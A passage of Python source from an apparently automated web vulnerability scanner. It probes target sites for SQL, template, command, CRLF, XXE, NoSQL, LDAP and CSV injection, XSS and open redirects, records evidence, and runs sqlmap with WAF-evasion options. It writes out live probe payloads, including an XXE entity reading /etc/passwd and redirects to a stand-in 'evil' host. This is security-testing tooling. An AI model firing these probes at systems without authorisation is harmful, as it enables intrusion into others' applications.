_OPEN_REDIRECT_PAYLOADS = [
    "//evil.fracture.test/",
    "https://evil.fracture.test/",
    "/\\evil.fracture.test/",
    "///evil.fracture.test/",
]
_OPEN_REDIRECT_PARAMS = {
    "next", "url", "redirect", "return", "goto", "returnurl", "returnto",
    "target", "redir", "redirect_uri", "forward", "location", "continue",
    "ref", "back", "dest", "destination",
}
_OPEN_REDIRECT_EXTERNAL_RE = re.compile(r'evil\.fracture\.test', re.I)
_DESER_RESP_RE = re.compile(
    r'pickle|marshal|deserializ|yaml\.load|__reduce__|java\.io\.Serializable|'
    r'org\.apache\.commons\.collections|aced0005', re.I
)
_DESER_FIELD_RE = re.compile(
    r'^(serialized|object|payload|blob|pickle|marshal)$', re.I
)
_MASS_ASSIGN_FIELDS = [
    "is_admin", "isAdmin", "role", "user_role", "admin", "privilege",
    "permissions", "is_staff", "isStaff", "superuser", "is_superuser",
    "verified", "is_verified", "approved", "is_approved",
]
_UPLOAD_ACCEPT_DANGEROUS = re.compile(
    r'\.(php|phtml|asp|aspx|jsp|cgi|pl|py|sh|bat|ps1|vbs|war|jar)\b', re.I
)
_JSONP_CB_PARAMS = ["callback", "cb", "jsonp", "jsoncallback", "json_callback"]
_DESER_CONTENT_TYPES = [
    "application/x-java-serialized-object",
    "application/x-python-serialize",
    "application/x-marshal",
]


def _qs_inject(base_url: str, param: str, value: str,
               sess: requests.Session, timeout: int) -> "requests.Response | None":
    try:
        parsed = urllib.parse.urlparse(base_url)
        qs     = urllib.parse.parse_qs(parsed.query)
        qs[param] = [value]
        new_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
        return sess.get(new_url, timeout=timeout)
    except Exception:
        return None


def _strip_url_echo(text: str, r, extra: "list[str] | None" = None) -> str:
    """Remove the echoed request URL — in all encoding variants — from response text.

    Sites that reflect the full URL in their source (canonical tags, breadcrumbs,
    og:url meta, etc.) cause false positives when the injected payload is part of
    the URL.  Stripping every form of the URL leaves only content that was
    independently generated by the server, not passively reflected from the request.

    extra: additional raw string values to also strip in their encoded forms
           (use for probe markers that appear literally inside the URL).
    """
    for variant in (r.url,
                    urllib.parse.unquote(r.url),
                    urllib.parse.unquote_plus(r.url)):
        if variant:
            text = text.replace(variant, "")
    for val in (extra or []):
        for enc in (val,
                    urllib.parse.quote(val, safe=''),
                    urllib.parse.quote_plus(val)):
            if enc:
                text = text.replace(enc, "")
    return text


def _endpoint_dir_name(method: str, url: str) -> str:
    """Return a filesystem-safe directory name for an endpoint: METHOD__safe_path.

    Examples:
        GET  https://example.com/api/v1/users  →  GET__api_v1_users
        POST https://example.com/              →  POST__root
    """
    try:
        path = urllib.parse.urlparse(url).path.strip("/") or "root"
    except Exception:
        path = "root"
    safe_path = re.sub(r'[^\w\-]', '_', path)
    return f"{(method or 'GET').upper()}__{safe_path}"[:80]


def _save_http_evidence(out: "OutputManager", phase: str, label: str,
                        r: "requests.Response", *,
                        endpoint_url: str = "",
                        method: str = "") -> "tuple[str, str]":
    """Write HTTP request/response pair to the phase evidence directory.

    If *endpoint_url* is given the files are written into a per-endpoint
    subdirectory (``METHOD__safe_path/``) inside the phase directory.
    When the base filename already exists an incrementing index suffix
    (_01_, _02_, …) is appended so successive confirmations on the same
    parameter are preserved rather than overwritten.

    Returns (request_file_path, response_file_path).
    """
    safe = re.sub(r'[^\w]', '_', label)[:60]
    if endpoint_url:
        _m = method or (r.request.method if r.request else "GET")
        if out._output_role:
            role_safe = _RE_UNSAFE_FNAME.sub("_", out._output_role)
            ep_dir = out.root / phase / role_safe / _endpoint_dir_name(_m, endpoint_url)
        else:
            ep_dir = out.root / phase / _endpoint_dir_name(_m, endpoint_url)
        ep_dir.mkdir(parents=True, exist_ok=True)
        req_path  = ep_dir / f"{safe}_request.txt"
        resp_path = ep_dir / f"{safe}_response.txt"
        if req_path.exists():
            idx = 1
            while True:
                req_path  = ep_dir / f"{safe}_{idx:02d}_request.txt"
                resp_path = ep_dir / f"{safe}_{idx:02d}_response.txt"
                if not req_path.exists():
                    break
                idx += 1
    else:
        req_path  = out.output_path(phase, f"{safe}_request")
        resp_path = out.output_path(phase, f"{safe}_response")

    prep = r.request
    req_lines = [f"{prep.method} {prep.url}"]
    for k, v in (prep.headers or {}).items():
        req_lines.append(f"{k}: {v}")
    req_lines.append("")
    if prep.body:
        body = prep.body if isinstance(prep.body, str) \
               else prep.body.decode("utf-8", errors="replace")
        req_lines.append(body)
    req_path.write_text("\n".join(req_lines), encoding="utf-8")

    resp_lines = [f"HTTP/1.1 {r.status_code} {r.reason or ''}"]
    for k, v in r.headers.items():
        resp_lines.append(f"{k}: {v}")
    resp_lines.append("")
    resp_lines.append(r.text[:524288])
    resp_path.write_text("\n".join(resp_lines), encoding="utf-8")

    return str(req_path), str(resp_path)


def _parse_gobuster_with_status(filepath: "Path", base_url: str) -> "list[tuple[str, int | None, str | None]]":
    """Parse gobuster output returning (original_url, status_code, redirect_to_url) tuples.
    Handles both gobuster format and the TOP_200_PATHS fallback format."""
    results = []
    base = base_url.rstrip("/")
    for line in filepath.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        status = None
        m_status = re.search(r'\(Status:\s*(\d+)\)|\[(\d{3})\]', line)
        if m_status:
            status = int(m_status.group(1) or m_status.group(2))
        m_redir = re.search(r'-->\s*(https?://[^\]\s]+)', line)
        redirect_to = m_redir.group(1).rstrip("/\\") if m_redir else None
        m_path = re.match(r'(/\S+)', line)
        if m_path:
            results.append((f"{base}{m_path.group(1)}", status, redirect_to))
        elif redirect_to:
            # Line has redirect target but no leading path (unusual) — skip
            pass
    return results


def _parse_feroxbuster_with_status(filepath: "Path") -> "list[tuple[str, int | None, str | None]]":
    """Parse feroxbuster output returning (url, status_code, redirect_to_url) tuples."""
    results = []
    for line in filepath.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line:
            continue
        # Format: 301  GET  ...  http://target/admin => http://target/admin/
        m = re.match(r'^(\d{3})\s+\w+\s+.*?(https?://\S+?)(?:\s+=>\s+(https?://\S+))?$', line)
        if m:
            redirect_to = m.group(3).rstrip("/\\") if m.group(3) else None
            results.append((m.group(2).rstrip("/\\"), int(m.group(1)), redirect_to))
            continue
        m2 = re.search(r'(https?://\S+)', line)
        if m2:
            results.append((m2.group(1).rstrip("/\\"), None, None))
    return results


def _sm_normalize_redirect(redirect_url: str, base_host: str) -> "str | None":
    """Normalize a redirect Location to a relative path if it is in-scope, else None."""
    if not redirect_url:
        return None
    try:
        p = urllib.parse.urlparse(redirect_url)
        # Absolute URL — must be same host to be in-scope
        if p.scheme and p.hostname and p.hostname != base_host:
            return None
        return p.path or "/"
    except Exception:
        # Relative redirect (no scheme/host) — treat as-is if it starts with /
        if redirect_url.startswith("/"):
            return redirect_url
        return None


def _write_target_profile(out: "OutputManager", **updates) -> None:
    """Incrementally merge newly discovered information into target_profile.json.

    Each call merges *updates* into the existing profile — non-empty values are
    never overwritten by empty ones, and list/dict fields are merged rather than
    replaced.  Uses the same atomic-rename pattern as _write_structure_map.
    """
    tp_path = out.root / "target_profile.json"
    try:
        existing = json.loads(tp_path.read_text(encoding="utf-8")) if tp_path.exists() else {}
    except Exception:
        existing = {}
    for key, val in updates.items():
        if val is None or val == "" or val == [] or val == {}:
            continue
        if key == "technologies":
            _t_map = {t["name"]: t for t in existing.get("technologies", []) if t.get("name")}
            for t in val:
                n = t.get("name", "")
                if n and (n not in _t_map or (t.get("version") and not _t_map[n].get("version"))):
                    _t_map[n] = t
            existing["technologies"] = list(_t_map.values())
        elif key == "security_headers":
            _eh = existing.get("security_headers", {"present": [], "missing": []})
            for sub in ("present", "missing"):
                _eh[sub] = list(dict.fromkeys(_eh.get(sub, []) + (val.get(sub) or [])))
            existing["security_headers"] = _eh
        elif key == "cookies":
            existing["cookies"] = list(dict.fromkeys(existing.get("cookies", []) + val))
        elif key == "cms":
            _cms = existing.get("cms", [])
            for c in (val if isinstance(val, list) else [val]):
                if c and c not in _cms:
                    _cms.append(c)
            existing["cms"] = _cms
        elif key == "protocols":
            existing["protocols"] = list(dict.fromkeys(existing.get("protocols", []) + val))
        elif key == "bi_tools":
            _bi = existing.get("bi_tools", [])
            for _b in (val if isinstance(val, list) else [val]):
                if _b and _b not in _bi:
                    _bi.append(_b)
            existing["bi_tools"] = _bi
        elif key == "edge_security":
            _es = existing.get("edge_security", [])
            for _e in (val if isinstance(val, list) else [val]):
                if _e and _e not in _es:
                    _es.append(_e)
            existing["edge_security"] = _es
        else:
            if existing.get(key) and not val:
                continue
            existing[key] = val
    existing["last_updated"] = datetime.now().isoformat()
    try:
        _tp_tmp = tp_path.with_suffix(".tmp")
        _tp_tmp.write_text(json.dumps(existing, indent=2), encoding="utf-8")
        _tp_tmp.replace(tp_path)
    except Exception:
        pass


def _write_structure_map(out: "OutputManager", target: dict,
                         crawl_data: "dict | None" = None,
                         extra_urls: "list | None" = None,
                         path_statuses: "dict | None" = None,
                         path_redirects: "dict | None" = None,
                         evidence_files: "list | None" = None,
                         source: "str | None" = None) -> None:
    """Incrementally build and persist structure_map.json.

    Each call merges newly discovered paths into the existing map so information
    accumulates across phases without overwriting earlier data.
    path_statuses: dict of {path: status_code} to record HTTP status per path.
    path_redirects: dict of {path: redirect_url} for in-scope redirect targets.
    evidence_files: list of file paths that produced the new paths (added to the
                    "Web Structure Identified" finding for this target).
    """
    sm_path = out.root / "structure_map.json"
    try:
        existing = json.loads(sm_path.read_text()) if sm_path.exists() else {}
    except Exception:
        existing = {}

    paths: dict = existing.get("paths", {})
    _old_path_keys: set = set(paths.keys())
    base_host = target["hostname"]

    def _add_url(raw_url: str, status: "int | None" = None) -> None:
        try:
            raw_url = raw_url.strip('"\'').strip()
            if not raw_url:
                return
            # Reject anything that looks like an absolute URL to a different host
            if "://" in raw_url:
                p = urllib.parse.urlparse(raw_url)
                if not p.hostname or p.hostname != base_host:
                    return
                path = p.path or "/"
            else:
                path = raw_url if raw_url.startswith("/") else ("/" + raw_url)
            # Strip query/fragment — only the path is stored in structure_map
            path = path.split("?")[0].split("#")[0]
            # Final sanity: path must not contain a scheme fragment
            if "://" in path or not path.startswith("/"):
                return
            # Reject paths containing characters that are never valid unencoded in URL paths
            _BAD = frozenset(['"', "'", '<', '>', '\\', '^', '{', '}', '|', '`',
                               ' ', '\t', '\r', '\n', '\x00', ','])
            if any(c in _BAD for c in path):
                return
            # Validate percent-encoded sequences: % must be followed by exactly two hex digits
            _HEX = frozenset('0123456789abcdefABCDEF')
            i = 0
            while i < len(path):
                if path[i] == '%':
                    if i + 2 >= len(path) or path[i+1] not in _HEX or path[i+2] not in _HEX:
                        return
                    i += 3
                else:
                    i += 1
            # After URL-decoding, reject paths whose segments contain injection artifacts
            try:
                _decoded = urllib.parse.unquote(path, errors='strict')
                if any(c in _decoded for c in ('"', '<', '>')):
                    return
            except Exception:
                return
            entry = paths.setdefault(path, {})
            # HTTP status is write-once: the first writer (Role 1 / most
            # permissive context) sets it and later roles cannot overwrite it.
            # This keeps the Structure tab representative of the application's
            # surface as seen by the highest-privilege session.  Access Matrix
            # per-role statuses are tracked separately and are unaffected.
            if status is not None and "status" not in entry:
                entry["status"] = status
            if source and "source" not in entry:
                entry["source"] = source
        except Exception:
            pass

    if path_statuses:
        for ps_path, ps_status in path_statuses.items():
            _add_url(ps_path, ps_status)

    if path_redirects:
        for pr_path, pr_url in path_redirects.items():
            rt = _sm_normalize_redirect(pr_url, base_host)
            if rt:
                _add_url(pr_path)
                if pr_path in paths:
                    paths[pr_path]["redirect_to"] = rt

    if crawl_data:
        for lnk in crawl_data.get("links", []):
            _add_url(lnk)
        for form in crawl_data.get("forms", []):
            act = form.get("action", "")
            if act:
                try:
                    p = urllib.parse.urlparse(act)
                    if p.hostname and p.hostname != base_host:
                        continue
                    path = p.path or "/"
                    _add_url(path)
                    if path not in paths:
                        continue
                    entry = paths[path]
                    entry["has_form"] = True
                    if form.get("method"):
                        entry["form_method"] = form["method"].upper()
                    _inps = [i.get("name") for i in form.get("inputs", []) if i.get("name")]
                    if _inps:
                        _ex = set(entry.get("form_inputs", []))
                        _ex.update(_inps)
                        entry["form_inputs"] = sorted(_ex)
                except Exception:
                    pass
        for pe in crawl_data.get("params", []):
            _add_url(pe.get("url", ""))
            try:
                p = urllib.parse.urlparse(pe.get("url", ""))
                path = p.path or "/"
                if path in paths:
                    _ex = set(paths[path].get("params", []))
                    _ex.update(pe.get("params", []))
                    paths[path]["params"] = sorted(_ex)
            except Exception:
                pass

    for eu in (extra_urls or []):
        _add_url(eu)

    if "/" not in paths:
        paths["/"] = {}

    try:
        sm_path.write_text(json.dumps({
            "target":       target["url"],
            "generated_at": datetime.now().isoformat(),
            "paths":        dict(sorted(paths.items())),
        }, indent=2), encoding="utf-8")
    except Exception:
        pass

    # Emit / update the single "Web Structure Identified" finding for this target.
    # Only new paths (not seen on previous calls) are reported so the description
    # grows incrementally without duplicating lines already in the finding.
    try:
        _newly_added = sorted(set(paths.keys()) - _old_path_keys)
        if _newly_added:
            _ev_str = ",".join(str(f) for f in (evidence_files or []) if f)
            _desc   = "\n".join(_newly_added)
            out.add_finding(
                title="Web Structure Identified",
                url=target["url"],
                port=target["port"],
                risk="INFO",
                description=_desc,
                output=_desc,
                affected=target["url"],
                output_file=_ev_str,
                sources="fracture-structure",
                service=target["scheme"],
                owasp="",
                nist="",
            )
    except Exception:
        pass

    # Keep access_matrix.json in sync with every structure_map update so
    # Crucible can show a growing path list from the very first HTTP probe.
    # Pass no roles — the preliminary write only populates path entries; actual
    # per-role HTTP statuses are filled in by _phase_access_matrix after probing.
    # Seeding statuses here with "unauthenticated" was incorrect because
    # structure_map is updated during authenticated context passes too.
    try:
        _write_preliminary_access_matrix(out, target, [])
    except Exception:
        pass


def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                     out: OutputManager, sess: requests.Session,
                     crawl_data: dict, fast: bool = False,
                     waf_cdn: str = "") -> None:
    phase   = "injection"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    if waf_cdn:
        vc.log(
            f"[injection] WAF/CDN active ({waf_cdn}) — injection probes may be blocked. "
            "Absence of a finding does not confirm absence of the vulnerability. "
            "sqlmap will attempt WAF identification and evasion.",
            "WARNING",
        )
    forms   = crawl_data.get("forms", [])
    params  = crawl_data.get("params", [])
    vc.status(phase, "Injection Testing", "running", "SQLi heuristic", 0, 7)

    # 1. URL param error-based SQLi
    for entry in params:
        purl = entry["url"]
        for param in entry["params"]:
            r = _qs_inject(purl, param, "test'", sess, timeout)
            if r and _SQL_ERROR_RE.search(r.text):
                _rq, _rp = _save_http_evidence(out, phase, f"sqli_error_{param}", r, endpoint_url=purl, method="GET")
                out.add_finding(
                    title="SQL Injection (Error-Based)",
                    url=purl, port=target["port"], risk="CRITICAL",
                    description="User-controlled input is incorporated into SQL queries without parameterisation, allowing an attacker to read, modify, or delete database contents.",
                    output=f"Parameter: {param}\nURL: {purl}",
                    output_file=f"{_rq},{_rp}",
                    sources="fracture-injection", service=target["scheme"],
                    affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                    http_code=r.status_code,
                )
                vc.log(f"[injection] SQLi: {purl} param={param}", "SUCCESS")

    vc.status(phase, "Injection Testing", "running", "Form SQLi", 1, 7)
    # 2. Form-based SQLi
    for form in forms[:20]:
        action = form.get("action", url)
        method = form.get("method", "GET")
        inputs = form.get("inputs", [])
        for inp in inputs:
            pname = inp.get("name", "")
            if not pname:
                continue
            data = {i["name"]: "test" for i in inputs if i.get("name")}
            data[pname] = "test'"
            try:
                r = sess.post(action, data=data, timeout=timeout) if method == "POST" \
                    else sess.get(action, params=data, timeout=timeout)
                if _SQL_ERROR_RE.search(r.text):
                    _rq, _rp = _save_http_evidence(out, phase, f"sqli_form_{pname}", r, endpoint_url=action, method=method)
                    out.add_finding(
                        title="SQL Injection (Error-Based)",
                        url=action, port=target["port"], risk="CRITICAL",
                        description="User-controlled input is incorporated into SQL queries without parameterisation, allowing an attacker to read, modify, or delete database contents.",
                        output=f"Form: {action}\nField: {pname}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=action, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                        http_code=r.status_code,
                    )
            except Exception:
                pass

    # 3. sqlmap (non-fast)
    if not fast and params:
        sqlmap = _find_tool("sqlmap")
        if sqlmap:
            sq_timeout = cfg.get("sqlmap_timeout", 300)
            sample_url = params[0]["url"]
            sq_dir     = out.root / phase / "sqlmap"
            sq_dir.mkdir(exist_ok=True)
            cmd = [sqlmap, "-u", sample_url, "--batch", "--level=2", "--risk=2",
                   f"--timeout={sq_timeout}", f"--output-dir={sq_dir}",
                   "--random-agent", "--forms"]
            if waf_cdn:
                cmd += ["--identify-waf", "--tamper=space2comment,between,randomcase"]
            vc.log("[injection] Running sqlmap ...", "INFO")
            try:
                proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                _register_proc(proc)
                stdout, _ = proc.communicate(timeout=sq_timeout + 60)
                _deregister_proc(proc)
                out.log_command("sqlmap", cmd, None)
                if re.search(r'Parameter.*is (vulnerable|injectable)', stdout, re.I):
                    out.add_finding(
                        title="SQL Injection Confirmed by sqlmap",
                        url=sample_url, port=target["port"], risk="CRITICAL",
                        description="User-controlled input is incorporated into SQL queries without parameterisation, allowing an attacker to read, modify, or delete database contents.",
                        output=stdout[:2000], sources="sqlmap",
                        service=target["scheme"],
                        owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                    )
            except Exception as e:
                out.log_error("sqlmap", cmd, str(e))

    vc.status(phase, "Injection Testing", "running", "XSS", 2, 7)
    # 4. Reflected XSS
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for payload in _XSS_PAYLOADS[:3]:
                r = _qs_inject(purl, param, payload, sess, timeout)
                if r and _xss_confirmed(payload, r):
                    _rq, _rp = _save_http_evidence(out, phase, f"xss_{param}", r, endpoint_url=purl, method="GET")
                    out.add_finding(
                        title="Reflected Cross-Site Scripting (XSS)",
                        url=purl, port=target["port"], risk="HIGH",
                        description="User-controlled input is reflected or stored and rendered in a browser context without proper encoding, enabling arbitrary script execution.",
                        output=f"Parameter: {param}\nPayload: {payload}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Encode all output contextually (HTML, JS, URL, CSS), sanitise stored input server-side, and enforce a strict Content-Security-Policy.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[injection] XSS: {purl} param={param}", "SUCCESS")
                    break

    # dalfox
    dalfox = _find_tool("dalfox")
    if dalfox and params:
        df_out = out.output_path(phase, "dalfox_" + target["hostname"])
        cmd    = [dalfox, "url", params[0]["url"], "--silence", "--output", str(df_out)]
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            stdout, _ = proc.communicate(timeout=120)
            _deregister_proc(proc)
            out.log_command("dalfox", cmd, df_out)
            if "POC" in stdout or "Reflected" in stdout:
                out.add_finding(
                    title="XSS Confirmed by dalfox",
                    url=params[0]["url"], port=target["port"], risk="HIGH",
                    description="dalfox confirmed XSS.",
                    output=stdout[:2000], sources="dalfox",
                    service=target["scheme"], output_file=str(df_out),
                    owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Encode all user output. Implement CSP.",
                )
        except Exception as e:
            out.log_error("dalfox", cmd, str(e))

    vc.status(phase, "Injection Testing", "running", "SSTI", 3, 7)
    # 5. SSTI
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for payload, expected in _ssti_probes():
                r = _qs_inject(purl, param, payload, sess, timeout)
                if not r:
                    continue
                _ssti_body = r.text
                for _enc in (r.url,
                             urllib.parse.unquote(r.url),
                             urllib.parse.unquote_plus(r.url),
                             payload,
                             urllib.parse.quote(payload),
                             urllib.parse.quote_plus(payload)):
                    _ssti_body = _ssti_body.replace(_enc, "")
                if expected in _ssti_body:
                    _rq, _rp = _save_http_evidence(out, phase, f"ssti_{param}", r, endpoint_url=purl, method="GET")
                    out.add_finding(
                        title="Server-Side Template Injection (SSTI)",
                        url=purl, port=target["port"], risk="CRITICAL",
                        description="User-controlled input is evaluated as template syntax by a server-side template engine (e.g., Jinja2, Twig, Freemarker), enabling arbitrary server-side code execution.",
                        output=f"Parameter: {param}\nPayload: {payload} → {expected}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Never pass user input directly to template rendering functions; treat user data as context variables only and use sandboxed or logic-less template engines where user-controlled content must appear in templates.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[injection] SSTI: {purl} param={param}", "SUCCESS")

    vc.status(phase, "Injection Testing", "running", "Command injection", 4, 7)
    # 6. Command injection
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for cmd_pay, cmd_pat in _CMD_PAYLOADS:
                r = _qs_inject(purl, param, "test" + cmd_pay, sess, timeout)
                if r and cmd_pat.search(r.text):
                    _rq, _rp = _save_http_evidence(out, phase, f"cmdi_{param}", r, endpoint_url=purl, method="GET")
                    out.add_finding(
                        title="OS Command Injection",
                        url=purl, port=target["port"], risk="CRITICAL",
                        description="User-controlled input is passed unsanitised to a system shell or OS command execution function, allowing an attacker to execute arbitrary commands on the host.",
                        output=f"Parameter: {param}\nPayload: {cmd_pay}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Eliminate shell calls that incorporate user input; use language-native library functions instead; where shell invocation is unavoidable, apply strict allowlist validation on all input values.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[injection] CMDi: {purl} param={param}", "SUCCESS")

    vc.status(phase, "Injection Testing", "running", "CRLF", 5, 7)
    # 7. CRLF injection
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            r = _qs_inject(purl, param, _CRLF_PAYLOAD, sess, timeout)
            if r and "X-Injected-Fracture" in str(r.headers):
                _rq, _rp = _save_http_evidence(out, phase, f"crlf_{param}", r, endpoint_url=purl, method="GET")
                out.add_finding(
                    title="CRLF Injection",
                    url=purl, port=target["port"], risk="MEDIUM",
                    description="User-supplied carriage-return and line-feed characters are reflected into HTTP response headers, allowing an attacker to inject arbitrary headers, split responses, or set malicious cookies.",
                    output=f"Parameter: {param}\nPayload: {_CRLF_PAYLOAD}",
                    output_file=f"{_rq},{_rp}",
                    sources="fracture-injection", service=target["scheme"],
                    owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Filter or reject CR (\\r) and LF (\\n) characters from any user-supplied value before it is written into an HTTP response header; use framework-level header APIs that prevent raw header injection.",
                    http_code=r.status_code,
                )

    vc.status(phase, "Injection Testing", "running", "XXE", 6, 7)
    # 8. XXE — test on forms that might accept XML
    _xxe_payload = ('<?xml version="1.0"?><!DOCTYPE foo '
                    '[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<foo>&xxe;</foo>')
    for form in forms[:10]:
        action = form.get("action", url)
        try:
            r = sess.post(action, data=_xxe_payload, timeout=timeout,
                          headers={"Content-Type": "application/xml"})
            if re.search(r'root:.*:/bin/', r.text):
                _rq, _rp = _save_http_evidence(out, phase, "xxe", r, endpoint_url=action, method="POST")
                out.add_finding(
                    title="XML External Entity (XXE) Injection",
                    url=action, port=target["port"], risk="CRITICAL",
                    description=f"XXE injection confirmed at {action}. /etc/passwd content was returned.",
                    output=r.text[:500],
                    output_file=f"{_rq},{_rp}",
                    sources="fracture-injection", service=target["scheme"],
                    affected=action, owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Disable external entity processing in XML parsers.",
                    http_code=r.status_code,
                )
                vc.log(f"[injection] XXE at {action}", "SUCCESS")
        except Exception:
            pass

    # 9. Second-order SQL injection
    vc.status(phase, "Injection Testing", "running", "Second-order SQLi", 7, 17)
    for form in forms[:5]:
        action = form.get("action", url)
        inputs = form.get("inputs", [])
        for inp in inputs:
            pname = inp.get("name", "")
            if not pname or inp.get("type") in ("hidden", "submit", "button"):
                continue
            data = {i["name"]: "fracture_test" for i in inputs if i.get("name")}
            data[pname] = "fracture_so_sqli'"
            try:
                sess.post(action, data=data, timeout=timeout)
                r2 = sess.get(action, timeout=timeout)
                if r2 and _SQL_ERROR_RE.search(r2.text):
                    _rq, _rp = _save_http_evidence(out, phase, f"sqli_so_{pname}", r2, endpoint_url=action, method="POST")
                    out.add_finding(
                        title="Second-Order SQL Injection",
                        url=action, port=target["port"], risk="CRITICAL",
                        description=(f"Second-order SQL injection detected via field '{pname}' at {action}. "
                                     f"A quote character stored in the field triggered a SQL error on the "
                                     f"next retrieval, indicating the stored value is interpolated unsafely."),
                        output=f"Field: {pname}\nStore payload: fracture_so_sqli'\nSQL error on retrieval",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=action, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Use parameterised queries for all database operations, including reads of stored values.",
                        http_code=r2.status_code,
                    )
                    vc.log(f"[injection] Second-order SQLi at {action} field={pname}", "SUCCESS")
                    break
            except Exception:
                pass

    # 10. CSV / formula injection
    vc.status(phase, "Injection Testing", "running", "CSV injection", 8, 17)
    _csv_found_forms: set = set()
    for form in forms[:15]:
        action = form.get("action", url)
        if action in _csv_found_forms:
            continue
        inputs = form.get("inputs", [])
        for inp in inputs:
            pname = inp.get("name", "")
            if not pname or inp.get("type") in ("hidden", "submit", "button", "password"):
                continue
            data = {i["name"]: "fracture_test" for i in inputs if i.get("name")}
            data[pname] = _CSV_INJECT_PAYLOADS[0]
            try:
                r = sess.post(action, data=data, timeout=timeout)
                _csv_marker = "fracture'!A0"
                _csv_body = r.text if r else ""
                _csv_body = re.sub(
                    r'(?:href|src|action|content|data(?:-[a-z][a-z0-9-]*)?)(?:\s*)=(?:\s*)["\'][^"\']*'
                    + re.escape(urllib.parse.quote(_csv_marker, safe=''))
                    + r'[^"\']*["\']',
                    '', _csv_body, flags=re.I)
                if (r and r.status_code in (200, 201, 302)
                        and _csv_marker in urllib.parse.unquote(_csv_body)):
                    _csv_found_forms.add(action)
                    _rq, _rp = _save_http_evidence(out, phase, f"csv_{pname}", r, endpoint_url=action, method="POST")
                    out.add_finding(
                        title="CSV / Formula Injection",
                        url=action, port=target["port"], risk="HIGH",
                        description=(f"Input field '{pname}' at {action} accepted a formula injection payload "
                                     f"({_CSV_INJECT_PAYLOADS[0]!r}). If this data is exported to a CSV or "
                                     f"spreadsheet, the formula may execute commands on the recipient's workstation."),
                        output=f"Field: {pname}\nPayload: {_CSV_INJECT_PAYLOADS[0]}\nResponse: {r.status_code}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=action, owasp="A03:2025 Injection", nist="SI-10",
                        remediation=(
                            "Sanitise all text inputs before CSV/Excel export. "
                            "Prefix cells beginning with =, +, -, @ with a single-quote character."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[injection] CSV injection at {action} field={pname}", "SUCCESS")
                    break
            except Exception:
                pass

    # 11. NoSQL injection
    vc.status(phase, "Injection Testing", "running", "NoSQL injection", 9, 17)
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for nosql_pay, nosql_err in _NOSQL_PAYLOADS:
                r = _qs_inject(purl, param, nosql_pay, sess, timeout)
                _nosql_body = _strip_url_echo(r.text, r, [nosql_pay]) if r else ""
                if r and nosql_err.search(_nosql_body):
                    _rq, _rp = _save_http_evidence(out, phase, f"nosql_{param}", r, endpoint_url=purl, method="GET")
                    out.add_finding(
                        title="NoSQL Injection",
                        url=purl, port=target["port"], risk="CRITICAL",
                        description="User-supplied input is incorporated into NoSQL query documents without type or operator validation, allowing an attacker to manipulate query logic and bypass authentication or exfiltrate data.",
                        output=f"Parameter: {param}\nPayload: {nosql_pay}\nResponse ({r.status_code}): {r.text[:300]}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Use parameterised query APIs or ODM/ORM frameworks that reject user-supplied operator tokens; enforce strict type validation on all inputs used in query construction.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[injection] NoSQL injection: {purl} param={param}", "SUCCESS")
                    break

    # 12. LDAP injection
    vc.status(phase, "Injection Testing", "running", "LDAP injection", 10, 17)
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for ldap_pay, ldap_err in _LDAP_PAYLOADS:
                r = _qs_inject(purl, param, ldap_pay, sess, timeout)
                _ldap_body = _strip_url_echo(r.text, r, [ldap_pay]) if r else ""
                _ldap_body = re.sub(
                    r'(?:href|src|action|content|data(?:-[a-z][a-z0-9-]*)?)(?:\s*)=(?:\s*)["\'][^"\']*'
                    + re.escape(ldap_pay)
                    + r'[^"\']*["\']',
                    '', _ldap_body, flags=re.I)
                if r and ldap_err.search(_ldap_body):
                    _rq, _rp = _save_http_evidence(out, phase, f"ldap_{param}", r, endpoint_url=purl, method="GET")
                    out.add_finding(
                        title="LDAP Injection",
                        url=purl, port=target["port"], risk="HIGH",
